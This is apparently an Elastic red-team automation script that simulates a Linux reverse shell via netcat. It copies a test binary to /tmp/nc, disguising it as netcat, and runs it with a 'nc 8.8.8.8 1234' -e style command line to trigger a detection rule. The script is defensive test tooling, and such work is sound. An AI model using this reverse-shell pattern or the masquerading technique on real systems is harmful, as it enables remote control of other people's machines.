# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import sys


@register_code_rta(
    id="ecb34b55-2947-48af-b746-3a472abfda43",
    name="linux_reverse_shell_via_netcat",
    platforms=[OSType.LINUX],
    endpoint_rules=[RuleMetadata(id="c0ca8114-254d-46ba-88c6-db57de6efe2d", name="Linux Reverse Shell via netcat")],
    siem_rules=[],
    techniques=["T1059", "T1071"],
)
def main() -> None:
    _common.log("Creating a fake nc executable..")
    masquerade = "/tmp/nc"
    source = _common.get_path("bin", "netcon_exec_chain.elf")
    _common.copy_file(source, masquerade)
    _common.log("Granting execute permissions...")
    _common.execute(["chmod", "+x", masquerade])
    commands = [masquerade, "chain", "-h", "8.8.8.8", "-p", "1234", "-c", "-e", "nc 8.8.8.8 1234"]
    _common.log("Simulating reverse shell activity..")
    _common.execute([*commands], timeout=5, kill=True, shell=True)  # noqa: S604
    _common.log("Reverse shell simulation successful!")
    _common.log("Cleaning...")
    _common.remove_file(masquerade)
    _common.log("Simulation successfull!")


if __name__ == "__main__":
    sys.exit(main())
